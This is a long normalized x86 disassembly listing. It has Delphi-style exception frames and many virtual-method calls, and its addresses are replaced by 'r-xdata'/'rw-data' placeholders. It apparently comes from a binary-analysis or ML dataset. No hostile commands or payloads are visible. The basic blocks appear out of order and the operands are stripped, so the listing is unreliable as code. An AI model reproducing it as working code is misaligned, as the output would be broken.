movzx eax [ eax + 0xb8 ]
sub al 0x1
jb r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x124 ]
call sub_4804d0
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
add eax 0xac
call sub_404e98
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x114 ] 0x0
jne r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xfc ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
call sub_405120
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0xc
call sub_404e44
jmp r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_489784
mov edx [ eax + 0x70 ]
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov eax r-xdata
call ebx
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_489784
mov edx [ eax + 0x70 ]
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov eax r-xdata
call ebx
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0xc
mov edx r-xdata
call sub_404e98
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x114 ] 0x0
jne r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xb8 ] 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_489784
add eax 0x70
mov edx r-xdata
call sub_40512c
mov eax [ ebp - 0x4 ]
call sub_489784
mov eax [ ebp - 0x4 ]
call sub_489784
mov edx [ eax + 0x70 ]
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov eax r-xdata
call ebx
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
call sub_405120
test eax eax
jne r-xdata
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4889e8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x124 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x128 ]
call sub_489c88
mov eax r-xdata
mov [ ebp - 0x1c ] eax
mov eax r-xdata
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xb0 ]
mov ecx 0x1
call sub_488524
test al al
je r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_489bdc
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0xc ]
add eax 0x88
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x88 ]
call sub_404e98
mov eax [ ebp - 0xc ]
mov eax [ eax + 0xc ]
add eax 0x90
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x90 ]
call sub_404e98
mov eax [ ebp - 0x8 ]
push [ eax + 0x1c ]
push [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0xc ]
call sub_486328
mov eax [ ebp - 0xc ]
mov eax [ eax + 0xc ]
add eax 0x60
mov edx r-xdata
call sub_404e98
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x124 ]
push [ ebx + 0x18 ]
push r-xdata
push [ ebx + 0x10 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0xc ]
add eax 0xac
mov edx 0x3
call sub_4051e4
mov eax [ ebp - 0xc ]
mov eax [ eax + 0xc ]
add eax 0xb0
mov edx r-xdata
call sub_404e98
mov eax [ ebp - 0xc ]
mov eax [ eax + 0xc ]
add eax 0x94
mov edx r-xdata
call sub_404e98
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x10 ]
mov [ edx + 0x90 ] eax
xor eax eax
push ebp
push sub_488e31
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_488df6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_489784
add eax 0x70
mov edx r-xdata
call sub_404e98
mov eax [ ebp - 0x8 ]
add eax 0x94
mov edx r-xdata
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488ec5
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_404e68
retn
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0xb4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x90 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x108 ]
mov eax [ ebp - 0xc ]
call sub_489e5c
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x10 ]
mov eax [ ebp - 0xc ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_488fa8
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x10 ]
add eax 0x88
mov edx r-xdata
call sub_404e98
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x10 ]
add eax 0xc
mov edx r-xdata
call sub_404e98
jmp r-xdata
lea edx [ ebp - 0x14 ]
or ecx 0xffffffff
mov eax [ ebp - 0xc ]
call sub_48a184
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8c ]
mov eax ebx
mov edx [ rw-data ]
call sub_4040f0
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x10 ]
call sub_489ad4
cmp eax 0xc8
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4889e8
xor edx edx
mov eax [ ebp - 0xc ]
call sub_489c88
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
call sub_477d64
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x10 ]
add eax 0x88
call sub_404e98
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x88 ]
call sub_405120
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xdc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x90 ]
call sub_403f64
lea edx [ ebp - 0xc ]
mov eax [ r-xdata ]
call sub_462560
retn
sub_488fa8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_48913e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_48911c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xf8 ] 0x0
jne r-xdata
cmp [ ebx + 0xf8 ] 0x0
je r-xdata
cmp [ ebx + 0x10c ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489123
lea edx [ ebp - 0x4 ]
mov eax [ r-xdata ]
call sub_462560
lea edx [ ebp - 0x8 ]
mov eax [ r-xdata ]
call sub_462560
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
call sub_48091c
mov eax [ esi + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
call sub_48091c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
sub esi 0x1
jno r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4650b8
mov edx eax
mov eax ebx
call sub_4891c8
mov [ ebx + 0x100 ] 0x1
test esi esi
jl r-xdata
call sub_403e34
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
sub esi 0x1
jno r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
test esi esi
jl r-xdata
call sub_403e34
lea ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x10 ]
mov eax [ ebx + 0x124 ]
mov ecx [ eax + 0x18 ]
mov eax [ ebx + 0xf8 ]
call sub_4846d4
inc [ ebp - 0xc ]
dec esi
jne r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebx + 0x124 ]
mov ecx [ eax + 0x18 ]
mov eax [ ebx + 0xf8 ]
call sub_484740
inc [ ebp - 0xc ]
dec esi
jne r-xdata
sub_489174
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_47fa0c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0xf8 ]
jne r-xdata
cmp edi [ esi + 0x110 ]
jne r-xdata
xor eax eax
mov [ esi + 0xf8 ] eax
jmp r-xdata
cmp edi [ esi + 0xfc ]
jne r-xdata
xor eax eax
mov [ esi + 0x110 ] eax
jmp r-xdata
xor eax eax
mov [ esi + 0xfc ] eax
sub_4891c8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xf8 ] 0x0
je r-xdata
mov [ ebx + 0xf8 ] esi
mov [ ebx + 0x100 ] 0x0
mov eax [ ebx + 0xf8 ]
test eax eax
je r-xdata
cmp [ ebx + 0x100 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
call sub_41db30
lea edx [ ebx + 0xf8 ]
mov eax [ r-xdata ]
call sub_462560
sub_489214
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_48946d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
add [ eax + 0xf0 ] 0x1
jno r-xdata
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
call sub_403e34
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x152 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x7c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
sub esi 0x1
jno r-xdata
mov al 0x1
lea ecx [ ebp - 0x20 ]
mov edx [ ebx + 0x80 ]
mov eax [ r-xdata ]
call sub_4626c4
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
test esi esi
jl r-xdata
call sub_403e34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489474
lea eax [ ebp - 0x2c ]
mov edx 0x5
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov esi [ ebx + 0xa0 ]
mov edx [ ebx + 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ ebx + 0x80 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea edx [ ebp - 0x24 ]
mov eax [ ebx + 0xa0 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov ecx [ ebp - 0x24 ]
mov eax [ esi + 0x8 ]
mov edx r-xdata
call sub_480ea0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x7c ]
mov eax esi
call sub_4822f0
mov [ ebp - 0xd ] 0x0
xor eax eax
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
inc esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x152 ] 0x0
je r-xdata
je r-xdata
mov [ ebp - 0xd ] al
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x0
jmp r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
mov eax [ ebx + 0xa0 ]
call sub_4823d4
sub al 0x1
jb r-xdata
mov edx [ ebx + 0x8c ]
mov eax [ ebx + 0xa0 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ ebx + 0x80 ]
mov eax [ ebx + 0xa0 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebp - 0xd ]
push eax
mov esi [ ebp - 0x8 ]
mov ecx [ ebx + 0xa0 ]
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x154 ]
call [ esi + 0x150 ]
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1
jmp r-xdata
dec al
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x18 ]
call [ eax + 0x1c ]
mov [ ebx + 0xa0 ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x7c ]
push eax
lea ecx [ ebp - 0x18 ]
mov esi [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x144 ]
call [ esi + 0x140 ]
lea ecx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x7c ]
mov edx [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xc ]
push 0x1
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov eax [ ebp - 0x1c ]
call sub_4821f0
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov [ ebx + 0x9c ] 0x1
lea edx [ ebp - 0x28 ]
mov eax [ ebx + 0xa0 ]
call sub_48240c
mov edx [ ebp - 0x28 ]
lea eax [ ebx + 0x8c ]
call sub_404e98
lea edx [ ebp - 0x2c ]
mov eax [ ebx + 0xa0 ]
call sub_4823e0
mov edx [ ebp - 0x2c ]
lea eax [ ebx + 0x80 ]
call sub_404e98
jmp r-xdata
mov [ ebp - 0xd ] 0x0
jmp r-xdata
sub_4894a2
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_489739
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
add [ eax + 0xf4 ] 0x1
jno r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x12c ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
call sub_403e34
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x12c ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x15a ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x78 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x14 ]
jg r-xdata
mov [ ebp - 0xd ] al
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov al 0x1
lea ecx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x78 ]
mov edx [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov eax [ ebp - 0x1c ]
call sub_4821f0
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x78 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489740
lea eax [ ebp - 0x24 ]
mov edx 0x3
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x12c ]
mov ebx [ eax + 0x4 ]
mov edx [ eax + 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x12c ]
mov edx [ eax + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x78 ]
mov eax ebx
call sub_4822f0
mov [ ebp - 0xd ] 0x0
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x15a ] 0x0
je r-xdata
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x78 ]
push eax
lea ecx [ ebp - 0x18 ]
mov ebx [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x12c ]
mov eax [ eax + 0x4 ]
call sub_4823d4
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x12c ]
mov edx [ eax + 0x14 ]
mov eax [ eax + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x12c ]
mov edx [ eax + 0x8 ]
mov eax [ eax + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x12c ]
mov ecx [ eax + 0x4 ]
mov ebx [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x15c ]
call [ ebx + 0x158 ]
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1
jmp r-xdata
dec al
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x18 ]
call [ eax + 0x1c ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x12c ]
mov [ edx + 0x4 ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x12c ]
mov eax [ eax + 0x4 ]
call sub_48240c
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x12c ]
add eax 0x14
call sub_404e98
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x12c ]
mov eax [ eax + 0x4 ]
call sub_4823e0
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x12c ]
add eax 0x8
call sub_404e98
jmp r-xdata
mov [ ebp - 0xd ] 0x0
jmp r-xdata
sub_489550
call sub_404854
add [ ebp - 0x14 ] 0x1
jno r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x78 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x14 ]
jg r-xdata
call sub_403e34
lea ecx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x78 ]
mov edx [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov eax [ ebp - 0x1c ]
call sub_4821f0
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x78 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x0
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x78 ]
push eax
lea ecx [ ebp - 0x18 ]
mov ebx [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489740
lea eax [ ebp - 0x24 ]
mov edx 0x3
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x12c ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x18 ]
call [ eax + 0x1c ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x12c ]
mov [ edx + 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x15a ] 0x0
jne r-xdata
mov [ ebp - 0xd ] al
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x12c ]
mov ebx [ eax + 0x4 ]
mov edx [ eax + 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x12c ]
mov edx [ eax + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x78 ]
mov eax ebx
call sub_4822f0
mov [ ebp - 0xd ] 0x0
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x15a ] 0x0
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x12c ]
mov eax [ eax + 0x4 ]
call sub_4823d4
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x12c ]
mov edx [ eax + 0x14 ]
mov eax [ eax + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x12c ]
mov edx [ eax + 0x8 ]
mov eax [ eax + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x12c ]
mov ecx [ eax + 0x4 ]
mov ebx [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x15c ]
call [ ebx + 0x158 ]
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x12c ]
mov eax [ eax + 0x4 ]
call sub_48240c
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x12c ]
add eax 0x14
call sub_404e98
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x12c ]
mov eax [ eax + 0x4 ]
call sub_4823e0
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x12c ]
add eax 0x8
call sub_404e98
jmp r-xdata
mov [ ebp - 0xd ] 0x0
jmp r-xdata
sub_4897f0
call sub_482888
mov eax ebx
call sub_489784
mov eax [ eax + 0xa0 ]
call sub_403f64
mov eax ebx
call sub_489784
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebx + 0x12c ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x10 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov eax [ ebx + 0x12c ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
sub_489850
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_4898ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_489784
add eax 0x38
mov edx [ esi + 0xc ]
call sub_404e98
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_487d70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4898b2
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_4898bc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_486d38
mov [ edi + 0x80 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_4898fc
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_489aa1
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x88 ]
mov ecx 0x3
mov edx 0x6
call sub_405384
xor ebx ebx
mov esi rw-data
inc ebx
add esi 0x4
cmp bl 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x94 ] bl
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ esi ]
call sub_464d00
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x80 ]
mov edx [ eax ]
call [ edx + 0x5c ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x80 ]
mov edx [ eax ]
call [ edx + 0x5c ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8c ] bl
test bl bl
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x80 ]
mov eax [ eax + 0x8c ]
xor ecx ecx
xor edx edx
mov ebx [ eax ]
call [ ebx + 0x64 ]
mov eax [ ebp - 0x8 ]
movzx ebx [ eax + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489aa8
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x80 ]
movzx eax [ eax + 0x114 ]
sub al 0x1
jb r-xdata
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ r-xdata ]
call sub_4626c4
mov eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_464d00
test al al
jne r-xdata
jne r-xdata
mov al 0x1
lea ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x74 ]
mov eax [ r-xdata ]
call sub_4626c4
mov eax [ ebp - 0x18 ]
mov edx r-xdata
call sub_464d00
test al al
jne r-xdata
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ r-xdata ]
call sub_4626c4
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_464d00
test al al
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x74 ]
mov eax [ r-xdata ]
call sub_4626c4
mov eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_464d00
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8c ] al
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8c ] al
jmp r-xdata
mov al 0x1
sub_489ad4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_489b77
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x88 ]
call sub_404edc
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov eax [ r-xdata ]
call sub_4626c4
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_404edc
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
xor ecx ecx
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0x10 ]
or ecx 0xffffffff
mov eax [ r-xdata ]
call sub_462668
mov esi eax
mov [ ebx + 0x84 ] esi
mov ebx esi
